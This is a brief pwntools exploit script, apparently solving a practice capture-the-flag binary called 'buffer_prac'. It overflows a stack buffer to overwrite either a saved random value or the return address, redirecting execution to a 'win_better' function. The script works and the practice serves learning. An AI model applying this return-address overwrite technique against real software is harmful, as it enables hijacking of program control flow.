from pwn import *

p = process("./buffer_prac")
elf = p.elf

p.sendlineafter(b'?', b'49') # oops im not very good at this
p.recvuntil(b'y\\n')

payload = b'y'

# Overwrite saved random number (win)
if args.WIN:
    payload += b'A' * (0x16 - 0xC - 0x1)
    payload += b'1'

# Overwrite the return address (win_better)
else:
    payload += b'A' * (0x16 - 0x1)
    payload += p32(elf.symbols['win_better'])

p.sendlineafter(b'\n', payload)
p.interactive()